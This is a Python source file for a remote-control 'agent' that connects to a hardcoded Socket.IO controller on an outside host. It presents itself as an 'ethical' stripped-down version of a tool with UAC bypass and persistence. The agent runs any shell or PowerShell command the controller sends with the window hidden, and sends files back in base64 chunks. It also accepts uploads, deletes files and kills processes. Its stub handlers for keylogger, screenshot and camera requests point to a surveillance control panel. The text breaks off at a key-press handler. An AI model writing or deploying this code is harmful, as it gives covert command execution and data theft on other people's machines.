#!/usr/bin/env python3
"""
Pure Agent - Clean agent that connects to original controller.py
No UAC bypasses, no persistence, no privilege escalation
Compatible with existing controller.py Socket.IO events
"""

import socketio
import sys
import os
import platform
import subprocess
import threading
import time
import uuid
import psutil
import json
import base64
import io
from datetime import datetime
from pathlib import Path

# Configuration - connects to your existing controller
SERVER_URL = "https://agent-controller-backend.onrender.com"
# Or for local testing: SERVER_URL = "http://localhost:5000"

AGENT_ID = str(uuid.uuid4())

# Socket.IO client
sio = socketio.Client(
    reconnection=True,
    reconnection_attempts=0,
    reconnection_delay=5,
    reconnection_delay_max=30
)

# Streaming state
streaming_active = {
    'screen': False,
    'system': False
}
streaming_threads = {}

# Agent information
AGENT_INFO = {
    'id': AGENT_ID,
    'hostname': platform.node(),
    'os': platform.system(),
    'os_version': platform.version(),
    'architecture': platform.machine(),
    'username': os.getenv('USERNAME') or os.getenv('USER'),
    'ip': 'Unknown',
    'python_version': platform.python_version(),
    'type': 'pure_agent'  # Identifier
}

def log(message):
    """Simple logging"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print(f"[{timestamp}] {message}")

def execute_command(command):
    """Execute shell command and return output - supports both CMD and PowerShell"""
    try:
        log(f"Executing command: {command}")
        
        # Handle special commands that the original controller might send
        if command == 'start-stream' or command == 'start-screen-stream':
            return "Screen streaming not available in pure agent (requires screen capture libraries)"
        elif command == 'stop-stream':
            return "Screen streaming not active"
        elif command == 'start-camera-stream':
            return "Camera streaming not available in pure agent"
        elif command == 'start-audio-stream':
            return "Audio streaming not available in pure agent"
        elif command == 'shutdown':
            log("Shutdown requested by controller")
            sio.disconnect()
            sys.exit(0)
        
        # Handle file listing command
        elif command.startswith('list-files ') or command == 'list-files':
            try:
                parts = command.split(' ', 1)
                path = parts[1] if len(parts) > 1 else os.getcwd()
                path_obj = Path(path)
                
                if not path_obj.exists():
                    return f"Path not found: {path}"
                
                files = []
                for item in path_obj.iterdir():
                    try:
                        stat = item.stat()
                        size_str = f"{stat.st_size:,} bytes" if item.is_file() else "<DIR>"
                        modified = datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
                        files.append(f"{modified}  {size_str:>15}  {item.name}")
                    except:
                        files.append(f"                           <ERROR>  {item.name}")
                
                return f"Directory of {path_obj.absolute()}\n\n" + "\n".join(sorted(files))
            except Exception as e:
                return f"Error listing files: {str(e)}"
        
        # Determine if this is a PowerShell or CMD command
        powershell_indicators = [
            'get-', 'set-', 'new-', 'remove-', 'start-', 'stop-', 'test-',
            'invoke-', 'import-', 'export-', 'select-', 'where-', 'foreach-',
            '$', '|', 'write-host', 'write-output', '.ps1'
        ]
        
        # Check if command looks like PowerShell
        command_lower = command.lower()
        is_powershell = any(indicator in command_lower for indicator in powershell_indicators)
        
        # Map common Unix/Linux commands to Windows equivalents
        command_mappings = {
            'ls': 'dir',
            'ls -la': 'dir',
            'ls -l': 'dir',
            'pwd': 'cd',
            'cat': 'type',
            'rm': 'del',
            'cp': 'copy',
            'mv': 'move',
            'clear': 'cls',
            'ps': 'tasklist',
            'kill': 'taskkill /PID',
            'grep': 'findstr',
            'which': 'where'
        }
        
        # Auto-translate common Unix commands
        original_command = command
        for unix_cmd, windows_cmd in command_mappings.items():
            if command.strip().startswith(unix_cmd):
                command = command.replace(unix_cmd, windows_cmd, 1)
                log(f"Auto-translated: '{original_command}' → '{command}'")
                break
        
        # Handle cd commands specially - they need to actually change directory
        if command.strip().lower().startswith('cd '):
            try:
                path = command.strip()[3:].strip()
                # Remove quotes if present
                path = path.strip('"').strip("'")
                os.chdir(path)
                return f"Changed directory to: {os.getcwd()}"
            except Exception as e:
                return f"Error changing directory: {str(e)}"
        
        # Execute command
        if platform.system() == 'Windows':
            if is_powershell:
                # Execute via PowerShell
                ps_command = ['powershell', '-NoProfile', '-NonInteractive', '-Command', command]
                result = subprocess.run(
                    ps_command,
                    capture_output=True,
                    text=True,
                    timeout=30,
                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0,
                    encoding='utf-8',
                    errors='replace'  # Replace invalid Unicode chars
                )
            else:
                # Execute via CMD
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30,
                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0,
                    encoding='utf-8',
                    errors='replace'  # Replace invalid Unicode chars
                )
        else:
            # Unix/Linux/Mac
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                encoding='utf-8',
                errors='replace'
            )
        
        # Get output
        output = result.stdout if result.stdout else result.stderr
        if not output:
            output = "Command executed successfully (no output)"
        
        # Clean and format output
        output = clean_output(output)
        
        log(f"Command completed: {len(output)} characters")
        return output
        
    except subprocess.TimeoutExpired:
        return "Error: Command timed out after 30 seconds"
    except Exception as e:
        return f"Error executing command: {str(e)}"

def clean_output(output):
    """Clean and format command output for better readability"""
    try:
        # Remove excessive blank lines (more than 2 consecutive)
        lines = output.split('\n')
        cleaned_lines = []
        blank_count = 0
        
        for line in lines:
            if line.strip():
                cleaned_lines.append(line)
                blank_count = 0
            else:
                blank_count += 1
                if blank_count <= 2:  # Keep max 2 blank lines
                    cleaned_lines.append(line)
        
        output = '\n'.join(cleaned_lines)
        
        # Remove excessive spaces (more than 2 consecutive spaces)
        import re
        output = re.sub(r'  +', '  ', output)
        
        # Remove trailing whitespace from each line
        lines = output.split('\n')
        output = '\n'.join(line.rstrip() for line in lines)
        
        # Remove trailing blank lines
        output = output.rstrip('\n')
        
        return output
        
    except Exception as e:
        log(f"Error cleaning output: {e}")
        return output

def get_system_info():
    """Get system information - compatible with controller.py format"""
    try:
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        return {
            **AGENT_INFO,
            'cpu_usage': cpu_percent,
            'memory_total': memory.total,
            'memory_used': memory.used,
            'memory_percent': memory.percent,
            'disk_total': disk.total,
            'disk_used': disk.used,
            'disk_percent': disk.percent,
            'uptime': time.time() - psutil.boot_time(),
            'status': 'online'
        }
    except Exception as e:
        log(f"Error getting system info: {e}")
        return AGENT_INFO

# Socket.IO Event Handlers - Compatible with original controller.py

@sio.event
def connect():
    """Handle connection to controller"""
    log(f"✅ Connected to controller at {SERVER_URL}")
    log(f"Agent ID: {AGENT_ID}")
    log(f"Agent Type: Pure Agent (No UAC/Persistence)")
    
    # Register agent with controller using agent_connect event (controller.py expects this)
    system_info = get_system_info()
    
    registration_data = {
        'agent_id': AGENT_ID,
        'name': f'Pure-Agent-{AGENT_INFO["hostname"]}',
        'platform': f'{AGENT_INFO["os"]} {AGENT_INFO["os_version"]}',
        'ip': 'Auto-detected',
        'capabilities': ['commands', 'files', 'system_info', 'process_management', 'performance_monitoring'],
        'cpu_usage': system_info.get('cpu_usage', 0),
        'memory_usage': system_info.get('memory_percent', 0),
        'network_usage': 0,
        'system_info': {
            'hostname': AGENT_INFO['hostname'],
            'os': AGENT_INFO['os'],
            'os_version': AGENT_INFO['os_version'],
            'architecture': AGENT_INFO['architecture'],
            'username': AGENT_INFO['username'],
            'python_version': AGENT_INFO['python_version']
        },
        'uptime': system_info.get('uptime', 0)
    }
    
    log(f"Sending agent_connect event with data: {registration_data}")
    sio.emit('agent_connect', registration_data)
    
    # Also send agent_register for compatibility
    sio.emit('agent_register', {
        'agent_id': AGENT_ID,
        'platform': f'{AGENT_INFO["os"]} {AGENT_INFO["os_version"]}',
        'python_version': AGENT_INFO['python_version'],
        'timestamp': time.time()
    })

@sio.event
def connect_error(data):
    """Handle connection error"""
    log(f"❌ Connection error: {data}")

@sio.event
def disconnect():
    """Handle disconnection"""
    log("⚠️ Disconnected from controller")

@sio.on('command')
def on_command(data):
    """Handle command from controller - matches controller.py line 3168"""
    try:
        command = data.get('command', '')
        execution_id = data.get('execution_id', '')
        
        log(f"📨 Received 'command' event: {command} (execution_id: {execution_id})")
        
        # Handle special UI commands
        if command.startswith('list-dir:'):
            path = command[9:].strip() or '/'
            output = execute_command(f'list-files {path}')
        elif command.startswith('delete-file:'):
            path = command[12:].strip()
            try:
                path_obj = Path(path)
                if path_obj.is_dir():
                    import shutil
                    shutil.rmtree(path_obj)
                else:
                    path_obj.unlink()
                output = f"Deleted: {path}"
            except Exception as e:
                output = f"Error deleting {path}: {str(e)}"
        else:
            # Execute normal command
            output = execute_command(command)
        
        # Send result back to controller using command_result event
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'command': command,
            'output': output,
            'success': True,
            'execution_id': execution_id,
            'timestamp': time.time()
        })
        
        log(f"✅ Sent command_result for: {command}")
        
    except Exception as e:
        log(f"❌ Error handling command: {e}")
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'output': f"Error: {str(e)}",
            'success': False,
            'timestamp': time.time()
        })

@sio.on('execute_command')
def on_execute_command(data):
    """Handle execute_command event - for UI v2.1 compatibility"""
    try:
        command = data.get('command', '')
        agent_id = data.get('agent_id', '')
        
        if agent_id and agent_id != AGENT_ID:
            return
        
        log(f"Received execute_command: {command}")
        
        # Handle special UI commands
        if command.startswith('list-dir:'):
            path = command[9:].strip() or '/'
            output = execute_command(f'list-files {path}')
        elif command.startswith('delete-file:'):
            path = command[12:].strip()
            try:
                path_obj = Path(path)
                if path_obj.is_dir():
                    import shutil
                    shutil.rmtree(path_obj)
                else:
                    path_obj.unlink()
                output = f"Deleted: {path}"
            except Exception as e:
                output = f"Error deleting {path}: {str(e)}"
        else:
            # Execute normal command
            output = execute_command(command)
        
        # Send result back
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'command': command,
            'output': output,
            'success': True,
            'execution_time': 0,
            'timestamp': time.time()
        })
        
    except Exception as e:
        log(f"Error handling execute_command: {e}")
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'output': f"Error: {str(e)}",
            'success': False,
            'timestamp': time.time()
        })

@sio.on('get_system_info')
def on_get_system_info(data):
    """Handle system info request"""
    try:
        agent_id = data.get('agent_id', '')
        if agent_id and agent_id != AGENT_ID:
            return
        
        info = get_system_info()
        sio.emit('system_info_response', {
            'agent_id': AGENT_ID,
            'info': info,
            'timestamp': time.time()
        })
    except Exception as e:
        log(f"Error getting system info: {e}")

@sio.on('ping')
def on_ping(data):
    """Handle ping request from controller"""
    try:
        # Controller sends ping, we respond with pong
        # But we also send ping ourselves in heartbeat
        pass  # Already handled in heartbeat
    except Exception as e:
        log(f"Error handling ping: {e}")

@sio.on('pong')
def on_pong(data):
    """Handle pong response from controller"""
    try:
        # Controller responds to our ping with pong
        log(f"✅ Received pong from controller - Connection alive")
    except Exception as e:
        log(f"Error handling pong: {e}")

@sio.on('agent_registered')
def on_agent_registered(data):
    """Handle registration confirmation from controller"""
    try:
        log(f"✅ Agent successfully registered with controller!")
        log(f"Registration confirmed: {data}")
    except Exception as e:
        log(f"Error handling registration confirmation: {e}")

@sio.on('registration_error')
def on_registration_error(data):
    """Handle registration error from controller"""
    try:
        log(f"❌ Registration error: {data.get('message', 'Unknown error')}")
    except Exception as e:
        log(f"Error handling registration error: {e}")

@sio.on('agent_list_update')
def on_agent_list_update(data):
    """Handle agent list update from controller"""
    try:
        log(f"📋 Agent list update received - {len(data) if isinstance(data, dict) else 0} agents")
    except Exception as e:
        log(f"Error handling agent list update: {e}")

@sio.on('shutdown')
def on_shutdown(data):
    """Handle shutdown request from controller"""
    try:
        agent_id = data.get('agent_id', '')
        if agent_id and agent_id != AGENT_ID:
            return
        
        log("Shutdown requested by controller")
        
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'output': 'Pure agent shutting down...',
            'timestamp': time.time()
        })
        
        time.sleep(1)
        sio.disconnect()
        sys.exit(0)
        
    except Exception as e:
        log(f"Error during shutdown: {e}")

@sio.on('start_stream')
def on_start_stream(data):
    """Handle start stream request from controller"""
    try:
        stream_type = data.get('type', '')
        quality = data.get('quality', 'high')
        
        log(f"Stream request received: {stream_type} (quality: {quality})")
        
        # Inform that streaming is not available in pure agent
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'output': f'{stream_type.title()} streaming not available in pure agent (requires screen capture libraries)',
            'success': False,
            'timestamp': time.time()
        })
    except Exception as e:
        log(f"Error handling start_stream: {e}")

@sio.on('stop_stream')
def on_stop_stream(data):
    """Handle stop stream request from controller"""
    try:
        stream_type = data.get('type', '')
        log(f"Stop stream request received: {stream_type}")
        
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'output': f'{stream_type.title()} stream stopped',
            'success': True,
            'timestamp': time.time()
        })
    except Exception as e:
        log(f"Error handling stop_stream: {e}")

@sio.on('request_screenshot')
def on_request_screenshot(data):
    """Handle screenshot request - not available in pure agent"""
    try:
        agent_id = data.get('agent_id', '')
        if agent_id and agent_id != AGENT_ID:
            return
        
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'output': 'Screenshot not available in pure agent (no screen capture libraries)',
            'timestamp': time.time()
        })
    except Exception as e:
        log(f"Error handling screenshot: {e}")

@sio.on('start_keylogger')
def on_start_keylogger(data):
    """Handle keylogger request - not available in pure agent"""
    try:
        agent_id = data.get('agent_id', '')
        if agent_id and agent_id != AGENT_ID:
            return
        
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'output': 'Keylogger not available in pure agent (ethical version)',
            'timestamp': time.time()
        })
    except Exception as e:
        log(f"Error handling keylogger: {e}")

# ============================================================================
# FILE MANAGEMENT
# ============================================================================

@sio.on('list_files')
def on_list_files(data):
    """List files in a directory"""
    try:
        agent_id = data.get('agent_id', '')
        if agent_id and agent_id != AGENT_ID:
            return
        
        path = data.get('path', os.path.expanduser('~'))
        
        files = []
        try:
            path_obj = Path(path)
            if not path_obj.exists():
                raise FileNotFoundError(f"Path not found: {path}")
            
            for item in path_obj.iterdir():
                try:
                    stat = item.stat()
                    files.append({
                        'name': item.name,
                        'path': str(item),
                        'type': 'directory' if item.is_dir() else 'file',
                        'size': stat.st_size if item.is_file() else 0,
                        'modified': stat.st_mtime,
                        'permissions': oct(stat.st_mode)[-3:]
                    })
                except Exception as e:
                    log(f"Error reading item {item}: {e}")
            
            sio.emit('file_list', {
                'agent_id': AGENT_ID,
                'path': str(path_obj),
                'files': files,
                'success': True
            })
            
        except Exception as e:
            sio.emit('file_list', {
                'agent_id': AGENT_ID,
                'path': path,
                'files': [],
                'success': False,
                'error': str(e)
            })
            
    except Exception as e:
        log(f"Error listing files: {e}")

@sio.on('read_file')
def on_read_file(data):
    """Read file contents"""
    try:
        agent_id = data.get('agent_id', '')
        if agent_id and agent_id != AGENT_ID:
            return
        
        file_path = data.get('path', '')
        max_size = 1024 * 1024  # 1MB max for text files
        
        try:
            path_obj = Path(file_path)
            if not path_obj.exists():
                raise FileNotFoundError(f"File not found: {file_path}")
            
            if path_obj.stat().st_size > max_size:
                raise ValueError(f"File too large (max {max_size} bytes)")
            
            with open(path_obj, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            sio.emit('file_content', {
                'agent_id': AGENT_ID,
                'path': str(path_obj),
                'content': content,
                'success': True
            })
            
        except Exception as e:
            sio.emit('file_content', {
                'agent_id': AGENT_ID,
                'path': file_path,
                'content': '',
                'success': False,
                'error': str(e)
            })
            
    except Exception as e:
        log(f"Error reading file: {e}")

@sio.on('request_file_chunk_from_agent')
def on_request_file_chunk(data):
    """Handle file download request from controller"""
    try:
        filename = data.get('filename', '')
        download_id = data.get('download_id')
        
        log(f"File download requested: {filename}")
        
        chunk_size = 64 * 1024  # 64KB chunks
        
        try:
            path_obj = Path(filename)
            if not path_obj.exists():
                raise FileNotFoundError(f"File not found: {filename}")
            
            if not path_obj.is_file():
                raise ValueError(f"Not a file: {filename}")
            
            file_size = path_obj.stat().st_size
            
            log(f"Sending file: {filename} ({file_size} bytes)")
            
            with open(path_obj, 'rb') as f:
                offset = 0
                while True:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break
                    
                    # Encode chunk to base64
                    chunk_b64 = base64.b64encode(chunk).decode('utf-8')
                    
                    sio.emit('file_chunk_from_agent', {
                        'agent_id': AGENT_ID,
                        'filename': path_obj.name,
                        'download_id': download_id,
                        'chunk': chunk_b64,
                        'offset': offset,
                        'total_size': file_size
                    })
                    
                    offset += len(chunk)
                    time.sleep(0.01)  # Small delay to avoid overwhelming
            
            log(f"File download complete: {filename} ({file_size} bytes)")
            
        except Exception as e:
            log(f"Error reading file: {e}")
            sio.emit('file_chunk_from_agent', {
                'agent_id': AGENT_ID,
                'filename': filename,
                'download_id': download_id,
                'error': str(e)
            })
            
    except Exception as e:
        log(f"Error downloading file: {e}")

@sio.on('request_file_range')
def on_request_file_range(data):
    try:
        request_id = data.get('request_id')
        file_path = data.get('path') or data.get('filename') or ''
        start = data.get('start')
        end = data.get('end')

        if not request_id:
            return
        if not file_path:
            sio.emit('file_range_response', {'request_id': request_id, 'error': 'File path is required'})
            return

        try:
            path_obj = Path(file_path)
            if not path_obj.exists():
                raise FileNotFoundError(f"File not found: {file_path}")
            if not path_obj.is_file():
                raise ValueError(f"Not a file: {file_path}")

            total_size = path_obj.stat().st_size
            s = 0 if start is None else int(start)
            e = None if end is None else int(end)
            if s < 0:
                s = 0
            if s >= total_size and total_size > 0:
                raise ValueError('Range not satisfiable')

            with open(path_obj, 'rb') as f:
                f.seek(s)
                if e is None or e < 0:
                    chunk = f.read()
                    actual_end = s + len(chunk) - 1
                else:
                    read_len = max(0, (e - s + 1))
                    chunk = f.read(read_len)
                    actual_end = s + len(chunk) - 1

            chunk_b64 = base64.b64encode(chunk).decode('utf-8')
            sio.emit('file_range_response', {
                'request_id': request_id,
                'path': str(path_obj),
                'start': s,
                'end': actual_end,
                'total_size': total_size,
                'data': chunk_b64
            })
        except Exception as e:
            sio.emit('file_range_response', {'request_id': request_id, 'error': str(e)})
    except Exception as e:
        log(f"Error handling request_file_range: {e}")

@sio.on('request_file_thumbnail')
def on_request_file_thumbnail(data):
    try:
        request_id = data.get('request_id')
        file_path = data.get('path') or ''
        size = data.get('size', 256)

        if not request_id:
            return
        if not file_path:
            sio.emit('file_thumbnail_response', {'request_id': request_id, 'error': 'File path is required'})
            return

        try:
            s = int(size)
        except Exception:
            s = 256
        s = max(16, min(s, 512))

        path_obj = Path(file_path)
        if not path_obj.exists():
            raise FileNotFoundError(f"File not found: {file_path}")
        if not path_obj.is_file():
            raise ValueError(f"Not a file: {file_path}")

        ext = path_obj.suffix.lower().lstrip('.')
        out_bytes = None

        if ext in {'png', 'jpg', 'jpeg', 'gif', 'webp', 'bmp'}:
            from PIL import Image as PILImage
            with PILImage.open(path_obj) as img:
                img = img.convert('RGB')
                img.thumbnail((s, s))
                import io
                buf = io.BytesIO()
                img.save(buf, format='JPEG', quality=82, optimize=True)
                out_bytes = buf.getvalue()
        elif ext in {'mp4', 'mov', 'mkv', 'avi', 'webm', 'm4v'}:
            import cv2
            cap = cv2.VideoCapture(str(path_obj))
            frame = None
            try:
                cap.set(cv2.CAP_PROP_POS_MSEC, 1000)
                ok, frm = cap.read()
                if ok:
                    frame = frm
                else:
                    cap.set(cv2.CAP_PROP_POS_FRAMES, 0)
                    ok2, frm2 = cap.read()
                    if ok2:
                        frame = frm2
            finally:
                cap.release()

            if frame is not None:
                h, w = frame.shape[:2]
                scale = min(s / max(1, w), s / max(1, h), 1.0)
                nw, nh = max(1, int(w * scale)), max(1, int(h * scale))
                if (nw, nh) != (w, h):
                    frame = cv2.resize(frame, (nw, nh), interpolation=cv2.INTER_AREA)
                ok, enc = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 82])
                if ok:
                    out_bytes = enc.tobytes()

        if not out_bytes:
            sio.emit('file_thumbnail_response', {'request_id': request_id, 'error': 'Thumbnail not supported'})
            return

        sio.emit('file_thumbnail_response', {
            'request_id': request_id,
            'path': str(path_obj),
            'mime': 'image/jpeg',
            'data': base64.b64encode(out_bytes).decode('utf-8')
        })
    except Exception as e:
        sio.emit('file_thumbnail_response', {'request_id': data.get('request_id'), 'error': str(e)})

@sio.on('file_chunk_from_operator')
def on_file_chunk_from_operator(data):
    """Receive file upload chunk from operator (UI sends this)"""
    try:
        agent_id = data.get('agent_id', '')
        if agent_id and agent_id != AGENT_ID:
            return
        
        filename = data.get('filename', '')
        chunk_b64 = data.get('chunk_data') or data.get('data') or data.get('chunk') or ''
        offset = data.get('offset', 0)
        destination = data.get('destination_path', '')
        
        # Decode chunk
        chunk = base64.b64decode(chunk_b64)
        
        # Determine file path
        if destination:
            file_path = Path(destination) / filename
        else:
            file_path = Path.home() / 'Downloads' / filename
        
        # Create directory if needed
        file_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Write chunk
        mode = 'ab' if offset > 0 else 'wb'
        with open(file_path, mode) as f:
            f.write(chunk)
        
    except Exception as e:
        log(f"Error uploading file chunk: {e}")

@sio.on('file_upload_complete_from_operator')
def on_file_upload_complete(data):
    """File upload complete"""
    try:
        agent_id = data.get('agent_id', '')
        if agent_id and agent_id != AGENT_ID:
            return
        
        filename = data.get('filename', '')
        destination = data.get('destination_path', '')
        
        if destination:
            file_path = Path(destination) / filename
        else:
            file_path = Path.home() / 'Downloads' / filename
        
        sio.emit('file_operation_result', {
            'agent_id': AGENT_ID,
            'operation': 'upload',
            'file_path': str(file_path),
            'success': True,
            'file_size': file_path.stat().st_size if file_path.exists() else 0
        })
        
        log(f"File upload complete: {file_path}")
        
    except Exception as e:
        log(f"Error completing file upload: {e}")

@sio.on('delete_file')
def on_delete_file(data):
    """Delete a file"""
    try:
        agent_id = data.get('agent_id', '')
        if agent_id and agent_id != AGENT_ID:
            return
        
        file_path = data.get('path', '')
        
        try:
            path_obj = Path(file_path)
            if path_obj.exists():
                if path_obj.is_file():
                    path_obj.unlink()
                elif path_obj.is_dir():
                    import shutil
                    shutil.rmtree(path_obj)
                
                sio.emit('file_operation_result', {
                    'agent_id': AGENT_ID,
                    'operation': 'delete',
                    'file_path': str(path_obj),
                    'success': True
                })
            else:
                raise FileNotFoundError(f"Path not found: {file_path}")
                
        except Exception as e:
            sio.emit('file_operation_result', {
                'agent_id': AGENT_ID,
                'operation': 'delete',
                'file_path': file_path,
                'success': False,
                'error_message': str(e)
            })
            
    except Exception as e:
        log(f"Error deleting file: {e}")

# ============================================================================
# SYSTEM MONITORING
# ============================================================================

def get_detailed_system_info():
    """Get comprehensive system information"""
    try:
        # CPU info
        cpu_percent = psutil.cpu_percent(interval=1, percpu=True)
        cpu_freq = psutil.cpu_freq()
        cpu_count = psutil.cpu_count()
        
        # Memory info
        mem = psutil.virtual_memory()
        swap = psutil.swap_memory()
        
        # Disk info
        disk_partitions = []
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                disk_partitions.append({
                    'device': partition.device,
                    'mountpoint': partition.mountpoint,
                    'fstype': partition.fstype,
                    'total': usage.total,
                    'used': usage.used,
                    'free': usage.free,
                    'percent': usage.percent
                })
            except:
                pass
        
        # Network info
        net_io = psutil.net_io_counters()
        net_connections = len(psutil.net_connections())
        
        # Process info
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            try:
                pinfo = proc.info
                processes.append({
                    'pid': pinfo['pid'],
                    'name': pinfo['name'],
                    'cpu': pinfo['cpu_percent'] or 0,
                    'memory': pinfo['memory_percent'] or 0
                })
            except:
                pass
        
        # Sort by CPU usage
        processes.sort(key=lambda x: x['cpu'], reverse=True)
        top_processes = processes[:10]
        
        return {
            'cpu': {
                'percent': sum(cpu_percent) / len(cpu_percent),
                'per_core': cpu_percent,
                'frequency': cpu_freq.current if cpu_freq else 0,
                'count': cpu_count
            },
            'memory': {
                'total': mem.total,
                'available': mem.available,
                'used': mem.used,
                'percent': mem.percent,
                'swap_total': swap.total,
                'swap_used': swap.used,
                'swap_percent': swap.percent
            },
            'disk': {
                'partitions': disk_partitions
            },
            'network': {
                'bytes_sent': net_io.bytes_sent,
                'bytes_recv': net_io.bytes_recv,
                'packets_sent': net_io.packets_sent,
                'packets_recv': net_io.packets_recv,
                'connections': net_connections
            },
            'processes': {
                'total': len(processes),
                'top': top_processes
            },
            'uptime': time.time() - psutil.boot_time()
        }
        
    except Exception as e:
        log(f"Error getting detailed system info: {e}")
        return {}

@sio.on('get_system_metrics')
def on_get_system_metrics(data):
    """Send detailed system metrics"""
    try:
        agent_id = data.get('agent_id', '')
        if agent_id and agent_id != AGENT_ID:
            return
        
        metrics = get_detailed_system_info()
        
        sio.emit('system_metrics', {
            'agent_id': AGENT_ID,
            'metrics': metrics,
            'timestamp': time.time()
        })
        
    except Exception as e:
        log(f"Error sending system metrics: {e}")

@sio.on('get_process_list')
def on_get_process_list(data):
    """Get detailed process list"""
    try:
        agent_id = data.get('agent_id', '')
        if agent_id and agent_id != AGENT_ID:
            return
        
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent', 'status', 'create_time']):
            try:
                pinfo = proc.info
                processes.append({
                    'pid': pinfo['pid'],
                    'name': pinfo['name'],
                    'cpu': pinfo['cpu_percent'] or 0,
                    'memory': pinfo['memory_percent'] or 0,
                    'status': pinfo['status'],
                    'started': pinfo['create_time']
                })
            except:
                pass
        
        sio.emit('process_list', {
            'agent_id': AGENT_ID,
            'processes': processes
        })
        
    except Exception as e:
        log(f"Error getting process list: {e}")

@sio.on('kill_process')
def on_kill_process(data):
    """Kill a process by PID"""
    try:
        agent_id = data.get('agent_id', '')
        if agent_id and agent_id != AGENT_ID:
            return
        
        pid = data.get('pid')
        
        try:
            proc = psutil.Process(pid)
            proc_name = proc.name()
            proc.terminate()
            
            # Wait up to 3 seconds for graceful termination
            proc.wait(timeout=3)
            
            sio.emit('command_result', {
                'agent_id': AGENT_ID,
                'output': f'Process {proc_name} (PID {pid}) terminated successfully',
                'success': True
            })
            
        except psutil.NoSuchProcess:
            sio.emit('command_result', {
                'agent_id': AGENT_ID,
                'output': f'Process with PID {pid} not found',
                'success': False
            })
        except psutil.TimeoutExpired:
            # Force kill if terminate didn't work
            proc.kill()
            sio.emit('command_result', {
                'agent_id': AGENT_ID,
                'output': f'Process {proc_name} (PID {pid}) force killed',
                'success': True
            })
            
    except Exception as e:
        log(f"Error killing process: {e}")
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'output': f'Error killing process: {str(e)}',
            'success': False
        })

# ============================================================================
# STREAMING (Text-based metrics streaming)
# ============================================================================

def system_metrics_stream():
    """Stream system metrics periodically"""
    global streaming_active
    
    log("System metrics streaming started")
    
    try:
        while streaming_active.get('system', False):
            if sio.connected:
                metrics = get_detailed_system_info()
                
                sio.emit('system_metrics_stream', {
                    'agent_id': AGENT_ID,
                    'metrics': metrics,
                    'timestamp': time.time()
                })
            
            time.sleep(2)  # Update every 2 seconds
            
    except Exception as e:
        log(f"Error in system metrics stream: {e}")
    finally:
        streaming_active['system'] = False
        log("System metrics streaming stopped")

@sio.on('start_system_monitoring')
def on_start_system_monitoring(data):
    """Start streaming system metrics"""
    global streaming_active, streaming_threads
    
    try:
        agent_id = data.get('agent_id', '')
        if agent_id and agent_id != AGENT_ID:
            return
        
        if not streaming_active.get('system', False):
            streaming_active['system'] = True
            
            thread = threading.Thread(target=system_metrics_stream, daemon=True)
            thread.start()
            streaming_threads['system'] = thread
            
            log("System monitoring started")
            
            sio.emit('command_result', {
                'agent_id': AGENT_ID,
                'output': 'System monitoring started - streaming metrics every 2 seconds',
                'success': True
            })
        else:
            sio.emit('command_result', {
                'agent_id': AGENT_ID,
                'output': 'System monitoring already active',
                'success': True
            })
            
    except Exception as e:
        log(f"Error starting system monitoring: {e}")

@sio.on('stop_system_monitoring')
def on_stop_system_monitoring(data):
    """Stop streaming system metrics"""
    global streaming_active
    
    try:
        agent_id = data.get('agent_id', '')
        if agent_id and agent_id != AGENT_ID:
            return
        
        streaming_active['system'] = False
        
        log("System monitoring stopped")
        
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'output': 'System monitoring stopped',
            'success': True
        })
        
    except Exception as e:
        log(f"Error stopping system monitoring: {e}")

def heartbeat():
    """Send periodic heartbeat to controller"""
    while True:
        try:
            if sio.connected:
                # Send agent_heartbeat (controller.py expects this)
                sio.emit('agent_heartbeat', {
                    'agent_id': AGENT_ID,
                    'timestamp': time.time()
                })
                
                # Also send ping for keep-alive
                sio.emit('ping', {
                    'agent_id': AGENT_ID,
                    'timestamp': time.time(),
                    'uptime': time.time() - psutil.boot_time()
                })
            time.sleep(30)
        except Exception as e:
            log(f"Heartbeat error: {e}")
            time.sleep(30)

def status_update():
    """Send periodic status updates to controller"""
    while True:
        try:
            if sio.connected:
                info = get_system_info()
                
                # Send agent_telemetry (controller.py line 3499)
                sio.emit('agent_telemetry', {
                    'agent_id': AGENT_ID,
                    'cpu_usage': info.get('cpu_usage', 0),
                    'memory_usage': info.get('memory_percent', 0),
                    'network_usage': 0,
                    'uptime': info.get('uptime', 0),
                    'timestamp': time.time()
                })
                
                # Also update agent_connect to refresh status
                sio.emit('agent_connect', {
                    'agent_id': AGENT_ID,
                    'name': f'Pure-Agent-{AGENT_INFO["hostname"]}',
                    'platform': f'{AGENT_INFO["os"]} {AGENT_INFO["os_version"]}',
                    'cpu_usage': info.get('cpu_usage', 0),
                    'memory_usage': info.get('memory_percent', 0),
                    'network_usage': 0,
                    'uptime': info.get('uptime', 0)
                })
            time.sleep(60)
        except Exception as e:
            log(f"Status update error: {e}")
            time.sleep(60)

# ═══════════════════════════════════════════════════════════════════
# REMOTE CONTROL HANDLERS (For UI v2.1)
# ═══════════════════════════════════════════════════════════════════

@sio.on('key_press')
